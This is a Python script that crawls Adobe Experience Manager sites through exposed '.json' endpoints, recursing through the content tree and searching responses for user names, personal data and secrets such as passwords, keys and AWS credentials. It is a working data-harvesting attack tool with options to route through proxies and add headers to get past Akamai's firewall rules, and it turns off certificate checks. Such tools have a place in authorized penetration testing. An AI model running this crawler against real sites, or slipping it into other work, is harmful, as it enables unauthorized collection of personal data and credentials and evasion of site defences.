import requests
import json
import re
import ast
import argparse

url_suffix = "/.1.json"
pattern = "/.{0}.{1}"

parser = argparse.ArgumentParser(description='Script for crawling endpoints on AEM environments - Detecting users content, PII and secrets')
parser.add_argument('--url', help='URL of the target along with the vulnerable path. Consider using a endpoint ending with \'.1.json\' or equal', required=True)
parser.add_argument('-d','--debug', action='store_true', help='debug output', default=False)
parser.add_argument('-p','--proxy', help='Https and http proxies.')
parser.add_argument('-l','--level', help='Depth level.')
parser.add_argument('-H','--Headers', help='Adding HTTP headers. Could be useful for bypass Akamai\'s rules')
args = parser.parse_args()

url=args.url
debug=args.debug
proxies = {}
MAX_LEVEL=5
headers = {'User-Agent': 'Mozilla/6.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0'}

if args.proxy:
    p = args.proxy
    proxies = {'http': p, 'https': p}

if args.level:
    MAX_LEVEL = args.level

if args.Headers:
    extra_headers = ast.literal_eval(args.Headers)
    if isinstance(extra_headers,dict):
        headers = {**headers, **extra_headers}


def get_max(maxu, val):
    if val>=maxu:
        return val
    return maxu

x=0
def counter():
    global x;
    x+=1;

#Improve this filters
searching_key_patterns=['publishedBy','cq:CreatedBy', 'createdBy', 'jcr:createdBy', 'dam:createdBy', 'cq:LastModifiedBy', 'lastModifiedBy', 'jcr:lastModifiedBy', 'dam:lastModifiedBy', 'jcr:deletedBy', 'deletedBy', 'cq:DeletedBy' , 'dam:deletedBy' ,'approvalEmail', 'dam:Author']
searching_value_patterns=[' password', ' pass', ' user', ' key', ' secret', ' author', ' auth', ' AWS' ]

def parse_json(json,key,n,url):
    for k, v in json.items():
        if isinstance(v, dict):
            parse_json(v,key,n+1,url)
        else:
            if k in key:
                print("Finding: {}:{}:{}".format(url,k,v))

def parse_json_value(json,value,n):
    for k, v in json.items():
        if isinstance(v, dict):
            parse_json_value(v,value,n+1)
        else:
            match = re.search(value, str(v),flags = re.IGNORECASE)
            if match:
                content = str(v).lower()
                i = content.find(value.lower())
                if (i>0):
                    chunk = "..."+ content[i-30:i+len(value)+30] + "..."
                    print("Finding value: {}:{}".format(k,chunk))


def find_disclosures( url, response ):
    for pattern in searching_key_patterns:
        match = re.search(pattern, response, flags = re.IGNORECASE)
        if match:
            print("In URL {} was detected the pattern '{}'".format(url,pattern))
            parse_json(json.loads(response),pattern,0,url)
    for pattern in searching_value_patterns:
        match = re.search(pattern, response, flags = re.IGNORECASE)
        if match:
            print("In URL {} was detected the pattern '{}'".format(url,pattern))
            parse_json_value(json.loads(response),pattern,0)


def send_http_request( url, headers=headers, proxies=None, debug=False ):
    if not proxies:
        proxies = {}
    if debug:
        print('*>> Sending {}'.format(url))
    try:
        response = requests.get(url, headers=headers, proxies=proxies, timeout=40, verify=False)
    except requests.exceptions.Timeout:
        print("The request to {} timed out!".format(url))
        raise Exception("Request timed out")
    if debug:
        print('*<< Received HTTP-{}', response.status_code)

    return response


def parse_response( level, url, result_json ):
    if (level == MAX_LEVEL):
        return
    
    for key in result_json.keys():
        crawl(level+1,url,key,9)


def crawl( level, url, key, num):
    new_path=url+"/"+key
    url_full = new_path + pattern.format(str(num),"json")
    try:
        r = send_http_request(url_full, headers=headers, proxies=proxies, debug=debug)

        if (r.status_code == 200):
            if("application/json" in r.headers['Content-Type']):
                parse_response(level, new_path, json.loads(r.text))
                find_disclosures(url_full, r.text)
                counter()
        if (r.status_code == 404):
            if (num==9):
                crawl(level,url,key,1)
        if (r.status_code == 300):
            result = ast.literal_eval(r.text)
            max_value = 0
            for i in result:
                match = re.search('\.([^.]+)\.', i)
                if match:
                    max_value = get_max(max_value,int(match.group()[1:-1]))
            crawl(level,url,key,max_value)
    except Exception:
        print("The request to {} timed out!".format(url))
    

def init():
    domain = ""
    if url.endswith(url_suffix):
        start_url = url
        domain = url[:-8]
    else:
        start_url = url+url_suffix
        domain = url
    
    level=1
    r = send_http_request(start_url, headers=headers, proxies=proxies, debug=debug)
    if (r.status_code == 200):
        if("application/json" in r.headers['Content-Type']):
            parse_response(level, domain, json.loads(r.text))

    
init()
print("# Valid Requests [{}]".format(x))

